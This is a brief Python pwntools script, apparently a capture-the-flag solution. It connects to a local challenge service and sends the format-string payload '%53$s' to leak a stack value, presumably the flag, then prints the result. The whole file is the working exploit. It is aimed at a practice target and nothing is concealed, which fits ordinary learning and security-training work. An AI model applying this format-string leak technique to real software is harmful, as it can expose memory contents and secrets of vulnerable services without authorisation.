from pwn import *

# just brute force it :)
p = remote("127.0.0.1", 59420)
# p = process("./chall", aslr=False)
payload = "%53$s"
p.sendlineafter(': ', payload.encode())
p.recvline()
res = p.recvline().decode().strip()

print(res)